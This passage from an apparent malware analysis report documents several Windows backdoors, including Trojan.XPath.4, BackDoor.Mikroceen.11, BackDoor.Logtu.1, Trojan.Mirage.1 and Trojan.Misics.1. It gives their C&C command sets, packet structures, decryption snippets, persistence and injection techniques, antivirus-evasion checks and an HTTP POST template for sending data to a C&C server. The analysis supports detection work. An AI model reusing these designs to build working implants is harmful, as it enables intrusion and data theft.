uses the socket\nto which it was earlier connected through the random port. After that, Trojan.XPath.4 sends\nthe packet TOKEN_CLIENT_LOGIN to the C&C server and waits for further commands\n(additional information about the commands is listed in the corresponding table of the\n**Commands list section of this description). Reception and dispatch of the packets is**\nexecuted in the same way as with the operation as a server (Agent (Server) Mode).\n\n\n-----\n\n**Packet dispatching**\n\nIf the packet has any data, that data is packed with the LZMA algorithm. As a result, the\nfollowing data structure is created:\n\n- The header in a form of the st_packet_header structure (this structure is described in\nthe “Operation in the Agent (Server) Mode” section):\n```\n #pragma pack(push,1)\n struct st_packet_header\n {\n _BYTE com_flag[4];\n _DWORD packed_size;\n _DWORD decomp_size;\n _DWORD cmdid;\n _BYTE pad[16];\n };\n #pragma pack(pop)\n\n```\n- Compressed data\n\nThe resulting data, together with the header, is compressed with the first AES key and sent to\nthe addressee. The only packet not compressed and encrypted with the AES key is the\n```\nst_hello packet.\n\n```\n**Commands list**\n\n|Commands IDs|Name of the command|Resulting action|\n|---|---|---|\n|0x138A|AGENT_SERVER_ALIVE|Confirms the Agent-server operation|\n|0x138D||Allocates additional socket or execute the command stored in the packet’s data|\n|0x138E|AGENT_CLIENT_NEW_CONN ECT_ACCEPT|Enables additional connection with the Agent-server and executes the command|\n|0x4E21|COMMAND_SERVER_ALIVE|Confirms the C&C server operation|\n\n\n-----\n\n|0x4E22|COMMAND_SERVER_CONNEC T|Sends the command to establish the connection with the C&C server|\n|---|---|---|\n|0x4E24|COMMAND_SERVER_NOTIFY _CLIENT|Establishes additional connection with the C&C server and executes the command|\n|0x4E25||Ends the connection|\n|0x4E26||Updates the trojan driver and the modules|\n|0x4E27||A command for the trojan to uninstall itself|\n|0x4E28|COMMAND_SERVER_READY|Checks if the server is ready|\n|0x4E2A||Ends the trojan process|\n|0x4E34||Forces the computer to shutdown|\n|0x4E35||Forces log out from the user’s computer account|\n|0x4E36||Forces the computer to reboot|\n|0x4E37||Powers off the computer|\n|0x4E38||Forces log out from the user’s computer account|\n|0x4E39||Reboots the computer|\n|0x5014|COMMAND_SHELL_START|Runs the Shell|\n|0x5015|COMMAND_CMDDLG_OPENED|Starts reading the data from the Shell|\n|0x5016||Sends the data to the Shell|\n|0x5017|COMMAND_SHELL_EXIT|Closes the Shell|\n|0x5078|COMMAND_TUNNEL_START|Launches the plug-in creating the tunnel|\n|0x5079||Sends the data to the C&C server that has a connected tunnel|\n\n\n-----\n\n|0x507A|Col2|Sets the C&C server address to which the tunnel will be created|\n|---|---|---|\n|0x507B|COMMAND_TUNNEL_NEW_CO NNECTION|Creates the tunnel to the specified C&C server|\n|0x507C||Receives NetBios name of the specified IP address|\n|0x5082|COMMAND_TUNNEL_EXIT|Disables the tunnel|\n|0x5E30|COMMAND_FILE_START|Runs file manager|\n|0x5E31||Directory listing|\n|0x5E32||Reads the file from the specified offset|\n|0x5E33||Creates the file|\n|0x5E34||Writes into the file from the specified offset|\n|0x5E36||Reads the file from the specified offset|\n|0x5E37||Transfers an empty packet with the 0x98BC code to the C&C server|\n|0x5E38||Deletes the specified file|\n|0x5E39||Recursively deletes the specified directory or files|\n|0x5E40||Obtains the file size|\n|0x5E41||Creates the folder|\n|0x5E42||Moves the file|\n|0x5E43||Runs the file with the window|\n|0x5E44||Runs the file without a window|\n|0x5E45||Ignored|\n|0x5E46||Ignored|\n|0x5E47||Receives the data about the file (creation and modification time,|\n\n\n-----\n\n|Col1|Col2|access information, file size, file type, the name of the app that can be used to open this file)|\n|---|---|---|\n|0x5E49||Sets file attributes specified in the command|\n|0x5E51||Disables the file manager|\n|0x5E52||Recursively lists the specified directory|\n|0x891C|TOKEN_CLIENT_LOGIN|Client authorization on the server|\n|0xEA66|PUBLIC_ACTIVE|Set public_active flag|\n\n\n**Artifacts**\n\nThe trojan file contains traces of debugging information that reveals the names of the\nfollowing source code files:\n```\n ..\\\\common\\\\LzmaLib.c\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\ringqueue.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\untils.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\ShellManager.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\file.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\tunnel.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\network.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpath\\\\clientmode.h\n xPathMain.c\n cyclone_tcp\\\\core\\\\bsd_socket.c\n\n```\nThe original functions names:\n```\n SendClientMagic\n FindPluginData\n DeCompressData\n GetSockInfo nocase\n StartShell\n UnInitShell\n UnInitFileManager\n recv_pack2\n x_gethostbyname\n OutputData\n tcpF\n WorkThread\n alloc_new_si\n x_decompress\n\n```\nThe original commands names:\n\n\n-----\n\nVarious debugging messages:\n\n\n#### BackDoor.Mikroceen.11\n\n\nBackDoor.Mikroceen.11 is a backdoor written in C++ and designed for 64-bit versions of the\nMicrosoft Windows operating systems. Upon installing, it connects to the C&C server directly\n\n\n-----\n\nor using the proxy server and begins executing attackers’ commands. It can collect\ninformation about the infected computer and execute commands, redirecting the output of\nthe command shell to the control server. In both investigated campaigns, it has been\ninstalled on the domain controller.\n\n##### Operating routine\n\nThe backdoor file represents a dynamic library with the single NwsapServiceMain export\nfunction. The sample in question was installed on the system as a service and located in the\n```\nc:\\windows\\system32\\nwsapagent.dll directory.\n\n```\nDuring the operation, it maintains an event log, which is stored in the %TEMP%\\\n```\n\\WZ9Jan10.TMP file. The messages in this log are obfuscated, and their possible variants\n\n```\nare shown below:\n\n- WvSa6a7i —launch of the trojan;\n\n- Dfi1r5eJ — direct connection to the C&C server;\n\n- PVrVoGx0 — connection to C&C server through previously defined proxy server;\n\n- Q29uUHJv — connection error;\n\n- 10RDu6mf — proxy server connection error;\n\n- 8sQqvdeX:%d — an error receiving the data from the C&C server;\n\n- Lw3s1gMZ — proxy server connection error;\n\n- IsEArF1k — successful connection;\n\n- CcFMGQb8 %s:%d — connection to the proxy server, recorded in the netlogon.cfg;\n\n- RWehGde0 %s:%d — connection to the proxy server, received through the WZ9Jan10.TMP\nfile parsing;\n\n- PV2arRyn %s:%d — connection to the proxy server, found through the tcptable;\n\n- W560rQz5 — SSL connection establishing.\n\nAll the relevant data, such as the C&C server address, is encrypted with a simple addition\noperation of the value with each byte of the string. The decrypting fragment is shown below:\n```\n for ( i = 0; i < lstrlenA(v4); ++i )\n v4[i] += 32 - i;\n\n```\nBackDoor.Mikroceen.11 tries to directly connect to the C&C server. If failed, it tries to\nconnect through the proxy server.\n\nThe connection is established when the trojan knows the proxy server address. Otherwise, it\nreads the %WINDIR%\\\\debug\\\\netlogon.cfg file, which must contain the IP:port line.\n\nIf the netlogon.cfg file is missing, or the trojan failed to connect to the address listed in it,\nthe trojan reads the line from its own log file and parses IP:port from it.\n\n\n-----\n\nIf there is no connection, the trojan parses information about current connections and\nsearches the connection with the MIB_TCP_STATE_ESTAB status and the following ports of\nthe remote host: 80, 8080, 3128, 9080. Among the selected connections, it searches\nfor the IP address from the following subnets: 10.0.0.0/8, 172.16.0.0/12,\n```\n192.168.0.0/16. The suitable address found is used as a proxy server address.\n\n```\nAfter successfully connecting, the trojan collects information about the infected system and\nfills the following structure:\n```\n #pragma pack(push, 1)\n struct st_info\n {\n  _WORD osproducttype;\n  _WORD processorarch;\n  _DWORD osservicepackmajor;\n  _DWORD osvermajor;\n  _DWORD osverminor;\n  _DWORD default_lcid;\n  _DWORD dword30001; // 30001\n  char id[16]; // \"wsx\"\n  char ip[16];\n  char hostname[32];\n };\n #pragma pack(pop)\n\n```\nBackDoor.Mikroceen.11 sends this information to the C&C server and waits for the reply.\nWhen exchanging commands, the text protocol is used, and the names of the commands are\nobfuscated. The list of commands is shown in the table below.\n\n|The command|An argument|The description|The reply|\n|---|---|---|---|\n|QHbU0hQo (file manager command)||Reads the file|First QWORD is the file size; next goes the file that was read with the 1024 bytes blocks|\n|Ki0Swb7I||Gets information about logical disks|A structure with the information about the disks, but not larger than 1024 bytes. #pragma pack(push, 1) struct st_drive_inf o { char cmdid[9]; // \"fqbnWkSA\" _WORD disks_count;|\n\n\n-----\n\n|The command|An argument|The description|The reply|\n|---|---|---|---|\n||||_DWORD disk_types[disks_co unt]; } #pragma pack(pop)|\n|J8AoctiB|string — is a command; string — is a path to the file to read; string — is a path to the file to write|Launches the file manager||\n|hwuvE43y (file manager command)|QWORD — is a file size; BYTE[]— is the data to be written into the file|Writes to the file|QWORD — the file size if the latter already exists|\n|h71RBG8X|string — is a command|Executes the command within the command shell; exit — closes the command shell||\n|gRQ7mIYr|string — is a path to the file|Runs a file with CreateProcessA|4FJTUaUX if successful KbZ5piK8 if failed|\n|eYTS5IwW||Ends the command shell process|bo7aO8Nb (if command shell was not launched)|\n|AmbZDkEx|string — is a password|The beginning of the exchange|kjoM4yJg (if the argument matches the line encoded into the file (\"12345\") Mf7VLAnr (in all other cases)|\n|5fdi2TfG||Launches a command shell, redirecting the output to the server||\n\n\n-----\n\n#### BackDoor.Logtu.1\n\n\nA multifunctional backdoor trojan for 32-bit and 64-bit Microsoft Windows operating\nsystems. It represents an executable library written in C++. It uses vector classes and strings\nfrom the STL library (Standard Template Library). The main function of the trojan is to obtain\nunauthorized access to infected computers and perform malicious actions at attackers’\ncommands.\n\n##### Operating routine\n\nThe library contains the following exporting functions:\n\n- ServiceMain\n\n- mymain\n\nThe mymain carries the main functionality of the trojan.\n\n**mymain function**\n\nWhen called, this function uses GetTempFileNameW to generate the name of the\ntemporary file with the .rar prefix and opens it for writing. This file is used as a journal.\nWriting to the journal is performed in the following format:\n```\n [%d-%02d-%02d %02d:%02d:%02d] %d %d\\n%s\\n\\n\" => \"[YYYY-MM-DD HH:MM:SS] <rec_id>\n <error_code>\\n<record>\\n\\n\n\n```\nwhere:\n\n- rec_id — is a record type ID;\n\n- error_code — error code (in most cases, it has a 0 value); if an error occurs during\nexecution, the GetLastError() or WSAGetLastError() value is written;\n\n- record — additional data.\n\nBefore it is added to the journal, the written data is encoded with the XOR operation, using\nthe 0x31 byte. The rec_id table of ID values is listed at the end of this description.\n\nNext, the trojan collects the following information about the infected system:\n\n\n-----\n\nIt then checks that the library runs inside the VMWare virtual machine environment. If it\ndetects a virtual machine, the corresponding information is added to the collected system\ndata, while the trojan continues to run.\n\nThere is a list of several C&C server addresses encoded inside the source code of the\nBackDoor.Logtu.1. They are encrypted with the XOR, using the 0x11 byte. However, only the\nfirst address from that list is used to control the backdoor:\n\n- 104.194.215[.]199;\n\n- 192.168.1[.]115;\n\n- www[.]test[.]com.\n\nMoreover, the trojan stores an array of ports within which each element corresponds to one\nof the servers above: 443, 443, 80.\n\nBackDoor.Logtu.1 has an option to use a proxy server, but the analyzed sample lacks such an\naddress. If the proxy server address is present, it is also encoded byte by byte with the XOR\noperation, using the 0x11 byte.\n\nAfter the initial preparation, the trojan launches the cycle of connections to the C&C server\nthrough the TCP socket. Within the first connection, BackDoor.Logtu.1 tries to directly\nconnect to the server. If it fails, it uses an HTTP proxy server if its address is encoded into the\nbody of the trojan. If it wasn’t successful, the trojan extracts the proxy server parameters\n\n\n-----\n\nfrom the [HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\n```\nSettings\\ProxyServer] registry key and tries to establish the connection. In case of\n\n```\nanother failure, the backdoor tries to obtain the proxy server information through the\nWinHTTP API, sending the google[.]com request via the WinHttpGetProxyForUrl\nfunction. If this attempt has also failed, BackDoor.Logtu.1 tries to extract the corresponding\nsettings from the HKU\\<session_user_SID>\\...\\ProxyServer registry key. This cycle\nrepeats until the trojan is successfully connected to the server.\n\nAfter successfully connecting, BackDoor.Logtu.1 sends the information about the infected\nsystem to the server. The data transfer and response receipt is divided into two stages:\n\n1. Sending the packet with the length of the payload,\n\n2. Sending the payload itself.\n\nThe value of the packet with the length of 4 bytes equals <payload_len>+4. This is\nbecause the packet with the payload contains a 4 bytes prefix, which in turn, contains the\npayload ID. Consequently, the payload has the format as shown below:\n```\n struct payload\n {\n DWORD payload_id;\n BYTE payload[payload_len];\n }\n\n```\nThe data transferred from the trojan to the server, as well as its response, are encrypted with\nthe RC4 algorithm. The encryption key is stored inside the trojan body as a separate string,\nbut calculates using the following algorithm:\n```\n from hashlib import md5\n password = \"123456\"\n salt = md5(\"\").hexdigest()\n key = md5(password + salt).hexdigest()\n\n```\nThe ID of the packet with the system information has a value of 0.\n\n\n-----\n\nAfter the system information is sent and the trojan receives the response from the server, it\nlaunches a thread that sends heartbeats every minute. Their ID has a value of 1 and the\npayload length has a value of 0. After 10 packets are sent, the server connection closes and\nreestablishes again.\n\nThe backdoor waits for the server reply with the packet with the length value that should not\nexceed 0x1F40. Next, it waits for the packet itself, which contains the command as a\npayload. After this packet is decrypted, it checks the value of the first DWORD, which is the\ncommand ID. The ID value should not exceed 0x34.\n\nIn some cases, the command contains additional parameters presented in the form of the\nstrings split with the | symbol. The structure of this command has the form of the\n```\n\"param_0\"|\"param_1\"|...|\"param_n\".\n\n```\nThe list of commands that the trojan can receive and execute is shown in the table below.\n\n|Command ID|Command description|\n|---|---|\n|0x00|NOP|\n|0x01|Calls GetTickCount(), writes the result into the global variable.|\n|0x02|In this command, two parameters separated with the | symbol, are received. The first one is the path to the file. The trojan uses it to form two new paths: · <param_0>.tu · <param_0>.tut|\n\n\n-----\n\n|Col1|Next, the trojan checks if the file with the original name, specified in the command, exists. If it exists, the trojan sends the response <param_1>|01 to the server. If it does not exist, it checks if the <param_0>.tu is present. If this file exists, the trojan sends its size as a <param_1>|<size>. If the <param_0>.tu file does not exist, the trojan creates the file <param_0>tut, writes the string, which consists of 32 zeros, into it and deletes the file. Depending on the command execution results, the trojan can send various types of responses to the server. In cases of failure at any given step of the command execution, the trojan sends <param_1>|<code>, where <code> can have a value from 01 to 05.|\n|---|---|\n|0x03|Creates an application process with the <param_0> name and <param_1> command line parameters.|\n|0x04|Runs a separate thread that lists the processes and sends the information about them to the C&C server one by one. Before the listing, the packet with the 0x17 ID and a DWORD 0x47 payload is sent to the server. It is sent as follows: struct process_info { WCHAR proc_name[30]; DWORD PID; DWORD parent_PID; WCHAR self_module_path[260] } Herewith, self_module_path is only sent when the process is running in the WOW64 environment. Otherwise, this string is filled with 0 values.|\n|0x05|Launches the cmd.exe thread. It creates the cmd.exe process with the input-output redirection into the pipes. After the process is created, it sends a packet with the 0x17 ID and a 0x3D payload in case of a successful connection, or 0x3E in case of a failure. Herewith, the trojan receives the input parameters of the command line from the message using the GetMessage function. The results are sent with the 0x06 ID.|\n|0x06|Input of the parameters for the cmd.exe. Using PostThreadMessage, it sends the message 0x464 to the cmd.exe thread and puts the data from the command into lParam.|\n|0x08|Ends the connection, sending a packet with the 0x17 packet ID and a DWORD 0x3E payload prior, then deletes its service and executable file.|\n|0x09|Opens the file for writing from the end and writes the buffer received in the command into it. Command’s parameters: · param_0 — name of the file; · param_1 — unknown value; · param_2 — buffer size;|\n\n\n-----\n\n|Col1|· param_3 — special flag; if it equals 1, then the file must be moved; · param_4 — a buffer for a writing. It adds a .tu extension to param_0, opens (or creates) the resulting file for writing, places the pointer to the end of the file and writes a param_4 buffer. If param_3 equals 1, then it deletes the param_0 file and renames the file <param_0>.tu into param_0.|\n|---|---|\n|0x14|Gets the size of the file specified in the command.|\n|0x15|Reads the 0x1000 bytes from the param_0 file, starting with param_2, and sends the results with the 0x15 ID to the server.|\n|0x16|Deletes the specified file. If successful, it sends a packet with the 0x17 ID and a DWORD 0x1F payload to the server; in case of an error, a packet with the 0x20 ID is sent instead.|\n|0x17|If the first DWORD of the command’s body equals 1, the trojan goes to sleep for 1 second; if it equals 2, the trojan closes the file handle.|\n|0x18|Ends the process with PID specified in the command. In return, the C&C server sends the packet with the 0x17 ID. If successful, DWORD 0x0B is sent along with this ID. If failed, 0x0C will be sent.|\n|0x19|Gets information about disks. Upon receiving this command, the trojan checks all the disks available from the letter A to the Z and sends information about each of them to the C&C server. The disk information is sent as a the following structure: struct disk_info { DWORD root_path; DWORD dword_0; DWORD type; DWORD dword_1; DWORD cdrom_or_removable; } Herewith, if the disk found has a DRIVE_REMOVABLE type or a DRIVE_CDROM type, the trojan indicates the value 1 in the cdrom_or_removable parameter. Prior to listing the disks, the trojan sends the disk_info structure with the dword_1 value, which equals 1, as well as other parameters, which are equal to 0.|\n|0x20|Gets the file list in the specified folder. The list is formed as lines of the <file_name>;<file_size>;<last_write_time(YYYY-MM-DD hh:mm:ss)>;<is_dir> format, which are separated by the | symbol. If the object represents the directory, the <is_dir> value is indicated as 1; if the object represents a file, the 0 value is indicated.|\n\n\n-----\n\n|0x22|Creates the TCP tunnel. This command has the host parameters to connect to. The parameters come as the following structure: struct tunnel_host { WORD index; char hostname[66]; DWORD port; } Where index is the tunnel index. After connecting to the host, the trojan receives a block with the size of 0x400 bytes and sends it to the C&C server as the following structure: struct tunnel_data { WORD index; char buffer[]; } After the last block is sent, the trojan sends the index with the 0x24 ID.|\n|---|---|\n|0x23|Sends the data to the tunnel. The C&C server sends the structure tunnel_data, and the trojan sends the data into the tunnel with the tunnel_data.index index.|\n|0x24|This command contains tunnel index that needs to be closed.|\n|0x25|This command contains the structure tunnel_host. The trojan creates a TCP socket, binds the port to tunnel_host.port, and awaits for the incoming connection. Upon receiving the incoming connection, the trojan sends a zero-length packet without a payload and 0x25 to the C&C server. After that, it receives the data from the new connection, along with the 0x26 ID and sends them to the C&C server.|\n|0x26|The command contains a tunnel_data structure. Upon receiving this command, the trojan sends the data to the connection it received in the 0x25 command.|\n|0x28|Ends the thread sending the heartbeats.|\n|0x29|Moves the file from param_0 to the param_1.|\n|0x31|Creates a desktop screenshot.|\n|0x33|Gets the list of running services as strings <service_name>;<service_display_name>;<current_state>, separated with the | symbol.|\n|0x34|Services management command. If param_0 has a 0 value, the trojan stops the param_1 service.|\n\n\n-----\n\n|Col1|If param_0 has a 1 value, the trojan launches the param_1 service.|\n|---|---|\n\n\nUpon receiving the command with the 0x17 ID, the trojan closes the file handler, which is\nstored in the global variable. This file is used only twice: once upon receiving the command,\nspecified earlier, and once in the journal writing function.\n\nFile handler closing:\n\nWriting to the journal (logging):\n\n**Table of the identifiers of the log entries types**\n\n|rec_id identifier|Error code|Log entry type|Description|\n|---|---|---|---|\n|0x01|0|No entry|Written at the beginning of the execution|\n|0x0E|0|The name of the C&C server||\n|0x0F|WSAGetLastError()|No entry|Added upon C&C server connection error|\n|0x07|0|Proxy server name||\n\n\n-----\n\n|0x08|0|No entry|Added before connecting to the proxy server|\n|---|---|---|---|\n|0x09|GetLastError()|No entry|Added upon proxy server connection failure|\n|0x0A|0|CONNECT <proxy_addr>:<pro xy_port> HTTP/1.1\\r\\nProxy -Authorization: Basic <proxy_auth>\\r\\n\\ r\\n or CONNECT <proxy_addr>:<pro xy_port> HTTP/1.1\\r\\n\\r\\n, if proxy server authorization parameters are missing|HTTP-proxy connection string|\n|0x0B|GetLastError()|No entry|Added if there is a proxy server connection error|\n|0x0C|GetLastError()|No entry|Added upon receiving an empty reply from a proxy server|\n|0x0D|0|Proxy server response|Added upon successfully connecting to the proxy server|\n|0x05|GetLastError()|No entry|Added when a HKCU\\Software\\Mic rosoft\\Windows\\Cu rrentVersion\\Inte rnet Settings registry key opening failed|\n|0x06|0|A not find proxy address string which is encoded inside the body of the trojan.|Added if ProxyServer registry parameter value receiving failed|\n\n\n-----\n\n|0x03|0|No entry|Added when a system information packet is sent through the proxy server, whose address is encoded inside the trojan body|\n|---|---|---|---|\n|0x04|0 1 2|No entry No entry No entry|Added when system information is sent through the proxy server: from the registry section HKCU; received using WinHTTP API; from the HKU\\<session_user _SID> registry section|\n|0x02|0|No entry|Added when system information is sent directly to the server|\n|0x10|0|No entry|Added after system information is sent to the server and before a thread with heartbeats is launched|\n\n\n#### Trojan.Mirage.1\n\n\nTrojan.Mirage.1 is a multi-component backdoor trojan designed for Windows 32-bit\noperating systems. It is used for unauthorized control of infected computers and accessing\ninformation stored on them. The infection is implemented through a loader injection into\nthe valid running system process. The payload unpacking and arbitrary code execution is\ndone on the infected computer’s RAM.\n\n##### Operating routine\n\nTrojan.Mirage.1 has the following file suite:\n\n- WmiPrvServer.exe — file with a valid HP digital signature:\n\n\n-----\n\n- rapi.dll — the loader. It loads on the WmiPrvServer.exe process using the DLL\nHijacking method,\n\n- cmdl32.dat — the encrypted shell code with the payload,\n\n- config.dat — the encrypted configuration.\n\n**Rapi.dll loader module**\n\nThe loader module is injected into the WmiPrvServer.exe process using the DLL Hijacking.\nThe program receives the GetProcAddress function address through the PEB (Process\nEnvironment Block) structure by comparing the strings. After that it receives the addresses of\nthe necessary imported functions:\n\n- LoadLibraryA\n\n- GetModuleFileNameA\n\n- VirtualAlloc\n\n- CloseHandle\n\n- CreateFileA\n\n- GetFileSize\n\n- ReadFile\n\nNext, the cmdl32.dat file, located in the same directory from where the parent process of the\ntrojan was launched, is read. The loader decrypts the file using the XOR operation with the\n```\n0x88 byte and jumps to the decrypted buffer using the JMP instruction.\n\n```\n\n-----\n\n**The encrypted shellcode cmdl32.dat**\n\nAt the start, the shellcode calculates the size of the payload. The beginning of the payload is\nfound through the call of the last shellcode function, and its end is determined by the\n```\n0xDDCCBBAA signature.\n\n```\n\n-----\n\nNext, the program receives the list of necessary imported functions. Through the PEB\nstructure, the trojan locates the GetProcAddress function, which it instantly uses to get the\n```\nLoadLibraryA function address. The search for the rest of the imports is done through\n\n```\nthese two functions.\n```\n strcmp\n memcpy\n VirtualAlloc\n VirtualProtect\n WriteFile\n lstrcatA\n GetModuleHandleA\n IsDebuggerPresent\n\n```\nNext, Trojan.Mirage.1 decrypts the payload using the XOR operation with the 0xCC byte,\nloads the resulting MZPE file onto the memory and calls the mystart exported function.\n\n\n-----\n\n**The payload**\n\nThe payload module represents a dynamic library with the exported functions:\n\n- OnWork\n\n- RunUninstallA\n\n- Uninstall\n\n- mystart\n\nBelow, we will dissect two major functions responsible for the trojan operation: mystart\nand OnWork.\n\n**mystart function**\n\nAt the beginning, the %TEMP%\\\\installstat.tmp file is checked to be present. If it exists,\nTrojan.Mirage.1 reads a proxy server address from it and then deletes this file.\n\nThe c:\\\\programdata\\\\Tmp\\\\cmd32\\\\cmd32 path is used as a home directory,\nherewith the creation, modification and access date for the c:\\\\programdata\\\\Tmp\\\n```\n\\cmd32\\\\cmd32 and c:\\\\programdata\\\\Tmp\\\\ folders are copied from the %WINDIR%\n\\\\System32\\\\winver.exe file.\n\n```\nThe Global\\\\dawdwere4de2wrw mutex is used to ensure that only one instance of the\nmalware is running.\n\nAt this stage, the program checks for the presence of the avp.exe and avpui.exe\nprocesses. If even one of them is found, then throughout its further operation the trojan will\nadditionally verify the presence of the object with the Global\\\\v2kjgtts1 event name. If\nit locates it, the trojan will halt its further operation.\n\nTrojan.Mirage.1 can operate in 3 modes. While operating as a service, it checks if the event\nobject with the Global\\\\v2kjgtts1 name exists. If the event object is missing, it copies\nits files from the current directory onto c:\\\\programdata\\\\Tmp\\\\cmd32\\\\cmd32 and\ninjects either into the iexplore.exe process (for the Windows systems, starting from\nWindows Vista and higher) or into the explorer.exe process (for the Windows systems\nbelow Windows Vista).\n\nWhile operating in the context of the explorer.exe or iexplore.exe processes, it\ndeletes its files from the %TEMP% directory, checks if the Global\\\\dawdwere4de2wrw\nmutex is present and creates it if missing. If the trojan is launched with elevated privileges, it\ncreates the Windows Event Update service; otherwise, it configures its autorun through the\n```\n[HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows]\n'Load' registry key and proceeds to execute its main functions.\n\n```\n\n-----\n\nFor the rest of the cases, Trojan.Mirage.1 checks for the Global\\\\dawdwere4de2wrw\nmutex. If it is missing, the malware injects either into the iexplore.exe process (for the\nWindows systems, starting from Windows Vista and higher) or into the explorer.exe\nprocess (for the Windows systems below Windows Vista).\n\n**OnWork Function**\n\nAfter receiving the imported functions, the application proceeds to execute its main\nfunctions, skipping installation onto the system routine.\n\nIt reads the c:\\\\programdata\\\\Tmp\\\\cmd32\\\\cmd32\\\\config.dat file and decrypts\nit using the following algorithm.\n\nThe configuration has the following structure:\n```\n struct st_config\n {\n  char cnc_addr[32];\n  char cnc_port[16];\n  char interval[16];\n  char timeout[16];\n  char unk3[16];\n  _DWORD unk4;\n  char trojan_name[16];\n  _DWORD unk5;\n  wchar_t campaign[32];\n };\n\n```\nNext, Trojan.Mirage.1 collects various information about the infected computer and forms\nthe following structure:\n\n\n-----\n\nThe %s-v1.0-%s line is stored in the version field; with that, the v1.0 value is hardcoded\nin the analyzed sample, while the two other lines, trojan_name and campaign, are taken\nfrom the settings.\n\nNext, an attempt to connect to the C&C server is made. To do so, the trojan checks for the\nproxy server settings in the [HKCU\\\\Software\\\\Microsoft\\\\Windows\\\n```\n\\CurrentVersion\\\\Internet Settings] 'ProxyEnable' and [HKCU\\\n\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings]\n'ProxyServer' registry entries. If settings are found, the trojan uses the corresponding\n\n```\nproxy server in its further requests.\n\nTrojan.Mirage.1 connects to the C&C server listed in its configuration and sends the\nfollowing packet:\n```\n struct st_hello\n {\n  _DWORD dword0; // 'f'\n  _DWORD dword4; // random value\n  _DWORD dword8; // random value\n  _DWORD dwordC; // random value\n  wchar_t text[256]; // \"Neo,welcome to the desert of real.\"\n };\n\n```\nIn response, it receives the following commands to execute:\n\n- 0 — send information about the infected computer;\n\n- 1 — run the plug-in designed to work with the file system;\n\n- 2 — run the plug-in designed to work with the command shell;\n\n- 5 — run the plug-in to work with the processes;\n\n- 6 — run the plug-in to work with the command shell on behalf of another user;\n\n- 7 — run the keylogger plug-in;\n\n- 51 — send information about the infected computer;\n\n- 52 — download an update for the trojan;\n\n- 53 — disconnect from the server;\n\n- 54 — disconnect from the server;\n\n- 200 — send the information about storage devices installed in the system;\n\n- 201 — send the directory listing;\n\n- 202 — delete a file;\n\n- 203 — move a file;\n\n\n-----\n\n- 204 — upload a file to the server;\n\n- 205 — download a file from the server;\n\n- 206 — create a directory;\n\n- 207 — run a command with the cmd.exe;\n\n- 300 — send a list of the processes in the infected system to the server;\n\n- 301 — kill a process with a specific identifier;\n\n- 400 — upload an event log of the keylogger to the server.\n\n**C&C server connection protocol**\n\nThe HTTP protocol is used to connect the malware with the C&C server. The requests have\nthe following format:\n```\n POST http://<cnc_addr>:<cnc_port>/result?hl=en&id=<id> HTTP/1.1\\r\\n\n Accept: */*\\r\\n\n Accept-Language: en-us\\r\\n\n User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)\\r\\n\n Proxy-Connection: Keep-Alive\\r\\n\n Content-Length: %d\\r\\n\n Content-Type: application/x-www-form-urlencoded\\r\\n\n Encoding: gzip, deflate\\r\\n\n Host: %s:%d\\r\\n\\r\\n\n\n```\nWhere <cnc_addr> is the C&C server address; <cnc_port> is the port of the C&C server;\n```\n<id> is a random string of lower-case letters of the Latin alphabet. The unique <id> is\n\n```\ngenerated for each request.\n\nThe data for the POST-request and the response is encrypted with the following algorithm:\n```\n for ( i = 0; i < data_size; ++i )\n  request[req_header_len + i] = (i ^ 0x7C) + data[i];\n\n```\nThe first DWORD in the server response is the identifier of the command, which should be\nexecuted by the bot. The rest of the buffer can contain the additional parameters for this\ncommand.\n\n**The plug-in designed to work with the command shell**\n\nFor the input/output redirection from the cmd.exe process, the following three files are used:\n\n- %TEMP%\\\\cache\\\\sysin_%d.log\n\n- %TEMP%\\\\cache\\\\sysout_%d.log\n\n- %TEMP%\\\\cache\\\\systemp_%d.log\n\nWhere %d is a random number, which is the same for all three files; it is generated at the\ntime of the plug-in launch. If the plug-in has been launched with command 6, the command\n\n\n-----\n\nbuffer should contain the domain and user login and password, from under which the\ncommand shell is being launched.\n\nAfter that, the trojan launches the command shell with the input/output redirection onto the\nfiles, mentioned earlier. The contents of the sysout_%d.log file will be sent to the C&C\nserver, and the response will be stored in the sysin_%d.log file.\n\n\n#### Trojan.Misics.1\n\n\nA multi-functional trojan backdoor for 64-bit Microsoft Windows operating systems. Its main\ncomponents are the loader and the payload that functions in the computer's RAM. Code\nobfuscation and two-step payload encryption are used to hide traces of malware presence\nin the system. The backdoor is designed for establishing an encrypted connection with the\nC&C server and for unauthorized control over an infected computer.\n\n##### Operating routine\n\nThe loader is a dynamic library with Rundll32Entry and ServiceEntry exported\nfunctions. During the infection process, it is installed in directory C:\n```\n\\ProgramData\\MISICS\\MISICS.dll.\n\n```\nIt can be launched as a service using svchost.exe or execute its own code using rundll32.exe.\nDuring initialization, it checks which way the process was launched. The trojan restarts using\nrundll32.exe with the -auto key, in case it was launched differently.\n\nFor obfuscation purposes, a large amount of garbage code is used, making it difficult to\ndetect the original instructions. The search for all utilized APIs is performed via the PEB\n(Process Environment Block) in the kernel32.dll and user32.dll libraries by name, which results\nin the API address being entered in the function table.\n\nNext, the program loads the <loader name>.crt file into memory, which is an encrypted\npayload. The first 4 bytes of the file are used to generate the decryption key, and the rest is\ndecrypted. The key is a checksum of the first 4 bytes calculated using the CRC32 algorithm.\nThe initial CRC value is set in the code 0xAC1FD22B. To decrypt each byte of data, the CRC\nresult from the DWORD is calculated, which contains the sequential number of the\ndecrypted byte. The CRC value from the previous step is the initial CRC value for the next\ncalculation.\n\n**Decryption algorithm**\n\n\n-----\n\nAfter decryption, the trojan checks the value of the first DWORD of the decrypted data. If it\nis not equal to 0x13AB7064, the decryption is considered incomplete.\n\nThe 0x318 byte configuration is located at the beginning of the decrypted data, and the\npayload is located right after it.\n\n\n-----\n\nThe field of the isPE structure can take the following values:\n\n- 0 — the payload is a shellcode,\n\n- 1 — the payload is MZPE file (.exe),\n\n- 2 — the payload is MZPE file 